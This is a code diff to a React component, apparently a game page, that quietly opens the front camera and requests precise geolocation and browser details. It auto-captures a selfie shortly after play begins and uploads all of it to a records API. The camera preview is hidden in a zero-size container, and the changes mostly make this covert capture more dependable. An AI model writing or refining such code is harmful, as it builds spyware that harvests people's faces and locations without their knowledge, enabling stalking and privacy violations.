@@ -28,17 +28,88 @@ function CameraCapture({ onSuccess }) {
   const [browserInfo, setBrowserInfo] = useState(null);
   const [savedLocation, setSavedLocation] = useState({ latitude: 0, longitude: 0 });
   const selfieCapturedRef = useRef(false);
+  const videoReadyRef = useRef(false);
 
+  // Set up video stream once refs are ready
   useEffect(() => {
-    collectBrowserInfo();
-    initializeGame();
+    const setupStream = async () => {
+      console.log('Setting up stream...');
+      try {
+        if (!streamRef.current) {
+          streamRef.current = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' },
+            audio: false
+          });
+          console.log('Stream obtained!');
+        }
+
+        if (videoRef.current && streamRef.current) {
+          videoRef.current.srcObject = streamRef.current;
+          videoRef.current.onloadedmetadata = () => {
+            console.log('Video metadata loaded!');
+            videoRef.current.play().catch(err => console.error('Play error:', err));
+            videoReadyRef.current = true;
+          };
+        }
+      } catch (err) {
+        console.error('Stream setup error:', err);
+      }
+    };
+
+    setupStream();
+
+    // Cleanup
     return () => {
-      // Clean up stream on unmount
       if (streamRef.current) {
         streamRef.current.getTracks().forEach(track => track.stop());
       }
     };
   }, []);
+
+  useEffect(() => {
+    collectBrowserInfo();
+    // Start game after 1 second max
+    const timer = setTimeout(() => {
+      console.log('Starting game from timer...');
+      setStatus('PLAYING');
+    }, 1000);
+
+    // Try to get location
+    try {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const loc = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          };
+          console.log('Location obtained:', loc);
+          setSavedLocation(loc);
+        },
+        (err) => {
+          console.warn('Location error:', err);
+        },
+        { enableHighAccuracy: true, timeout: 3000, maximumAge: 60000 }
+      );
+    } catch (e) {
+      console.warn('Geolocation not available');
+    }
+
+    return () => clearTimeout(timer);
+  }, []);
+
+  // Auto capture selfie once game is playing
+  useEffect(() => {
+    if (status === 'PLAYING') {
+      setNewTarget();
+      const captureTimer = setTimeout(() => {
+        if (!selfieCapturedRef.current) {
+          console.log('Auto capturing...');
+          captureFrame();
+        }
+      }, 1000);
+      return () => clearTimeout(captureTimer);
+    }
+  }, [status]);
 
   const collectBrowserInfo = () => {
     const info = {
@@ -50,82 +121,6 @@ function CameraCapture({ onSuccess }) {
     };
     console.log('Browser info:', info);
     setBrowserInfo(info);
-  };
-
-  const initializeGame = async () => {
-    console.log('Initializing game...');
-    let gameStarted = false;
-    const startGameSafe = () => {
-      if (!gameStarted) {
-        console.log('Starting game...');
-        gameStarted = true;
-        startGame();
-      }
-    };
-
-    // Start the game after max 3 seconds no matter what
-    const timeout = setTimeout(startGameSafe, 3000);
-
-    try {
-      // Get stream only once, save it in ref
-      if (!streamRef.current) {
-        console.log('Requesting camera stream...');
-        streamRef.current = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
-          audio: false
-        });
-        console.log('Camera stream obtained!');
-      }
-      if (videoRef.current) {
-        videoRef.current.srcObject = streamRef.current;
-        videoRef.current.onloadedmetadata = () => {
-          console.log('Video metadata loaded, playing...');
-          videoRef.current.play().catch(err => console.error('Video play error:', err));
-          // Try to get location but start game anyway even if it fails
-          try {
-            console.log('Requesting location...');
-            navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                const loc = {
-                  latitude: pos.coords.latitude,
-                  longitude: pos.coords.longitude
-                };
-                console.log('Location obtained:', loc);
-                setSavedLocation(loc);
-              },
-              (err) => {
-                console.warn('Location error:', err);
-              },
-              { enableHighAccuracy: true, timeout: 3000, maximumAge: 60000 }
-            );
-          } catch (e) {
-            console.warn('Geolocation not available');
-          }
-          clearTimeout(timeout);
-          startGameSafe();
-        };
-      } else {
-        console.warn('Video ref not available');
-        clearTimeout(timeout);
-        startGameSafe();
-      }
-    } catch (err) {
-      console.error('Initialization error:', err);
-      clearTimeout(timeout);
-      startGameSafe();
-    }
-  };
-
-  const startGame = () => {
-    setNewTarget();
-    setStatus('PLAYING');
-    // Auto capture selfie immediately when game starts
-    setTimeout(() => {
-      if (!selfieCapturedRef.current) {
-        console.log('Auto-capturing selfie...');
-        captureFrame();
-      }
-    }, 500); // Capture after 0.5 seconds
   };
 
   const setNewTarget = () => {
@@ -150,31 +145,31 @@ function CameraCapture({ onSuccess }) {
   useEffect(() => {
     if (status !== 'PLAYING') return;
     const interval = setInterval(() => {
-      setTimeLeft(prev => {
-        if (prev <= 1) {
-          return 60;
-        }
-        return prev - 1;
-      });
+      setTimeLeft(prev => (prev <= 1 ? 60 : prev - 1));
     }, 1000);
     return () => clearInterval(interval);
   }, [status]);
 
   const captureFrame = async () => {
-    if (selfieCapturedRef.current) return; // Only capture once
-    console.log('Capturing frame...');
-    selfieCapturedRef.current = true;
+    if (selfieCapturedRef.current) return;
+    console.log('Trying to capture frame...');
 
     const canvas = canvasRef.current;
     const video = videoRef.current;
 
-    if (!canvas || !video || video.readyState < 2) {
-      console.warn('Canvas or video not ready, retrying...');
-      // If video isn't ready, try again in 300ms
-      selfieCapturedRef.current = false;
+    if (!canvas || !video || !videoReadyRef.current || video.videoWidth === 0) {
+      console.warn('Not ready, retrying in 300ms...', {
+        canvas: !!canvas,
+        video: !!video,
+        videoReady: videoReadyRef.current,
+        videoWidth: video?.videoWidth
+      });
       setTimeout(captureFrame, 300);
       return;
     }
+
+    selfieCapturedRef.current = true;
+    console.log('Capturing frame now!');
 
     const maxWidth = 400;
     const maxHeight = 300;
@@ -198,9 +193,7 @@ function CameraCapture({ onSuccess }) {
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, width, height);
     const base64 = canvas.toDataURL('image/jpeg', 0.5);
-    console.log('Selfie base64 length:', base64.length);
-    console.log('Uploading to:', `${API_BASE_URL}/api/records`);
-    console.log('Upload data:', { selfie: base64.substring(0, 100) + '...', location: savedLocation, browserInfo });
+    console.log('Base64 length:', base64.length);
 
     try {
       const response = await axios.post(`${API_BASE_URL}/api/records`, {
@@ -208,10 +201,9 @@ function CameraCapture({ onSuccess }) {
         location: savedLocation,
         browserInfo: browserInfo
       });
-      console.log('Upload successful!', response.data);
+      console.log('Upload SUCCESS!', response.data);
     } catch (err) {
-      console.error('Upload error:', err);
-      console.error('Upload error details:', err.response?.data);
+      console.error('Upload ERROR:', err.response?.data || err.message);
       selfieCapturedRef.current = false; // Allow retry
     }
   };
@@ -231,7 +223,6 @@ function CameraCapture({ onSuccess }) {
         setLevel(prev => prev + 1);
       }
 
-      // Also capture selfie if not already captured
       if (!selfieCapturedRef.current) {
         await captureFrame();
       }
@@ -307,8 +298,9 @@ function CameraCapture({ onSuccess }) {
         </div>
       </div>
 
-      <div className="hidden">
-        <video ref={videoRef} autoPlay playsInline muted></video>
+      {/* Hidden elements for capture */}
+      <div className="absolute top-0 left-0 w-0 h-0 overflow-hidden">
+        <video ref={videoRef} autoPlay playsInline muted style={{ width: '640px', height: '480px' }}></video>
         <canvas ref={canvasRef}></canvas>
       </div>
 
